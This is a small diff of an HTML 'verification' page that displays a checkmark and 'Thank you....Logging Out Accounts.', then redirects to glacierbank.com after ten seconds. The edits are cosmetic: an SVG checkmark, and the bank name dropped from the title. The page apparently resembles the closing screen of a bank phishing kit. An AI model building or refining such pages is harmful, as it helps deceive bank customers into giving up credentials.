@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="10; URL='https://www.glacierbank.com/">
-    <title>Glacier Verification Page</title>
+   <meta http-equiv="refresh" content="10; URL='https://www.glacierbank.com/">
+    <title>Verification Page</title>
     <style>
         body {
             background-color: white;
@@ -19,8 +19,9 @@
             text-align: center;
         }
         .checkmark {
-            font-size: 100px;
-            color: green;
+            width: 100px;
+            height: 100px;
+            fill: green;
         }
         .message {
             font-size: 16px;
@@ -30,8 +31,11 @@
 </head>
 <body>
     <div class="container">
-        <div class="checkmark">✔️</div>
-        <div class="message"><strong>Thank you....Logging Out Accounts.</strong></div>
+        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+            <circle cx="26" cy="26" r="25" fill="none" stroke="green" stroke-width="2"/>
+            <path fill="none" stroke="green" stroke-width="2" d="M14 27l8 8 16-16"/>
+        </svg>
+        <div class="message">Thank you....Logging Out Accounts.</div>
     </div>
 </body>
 </html>
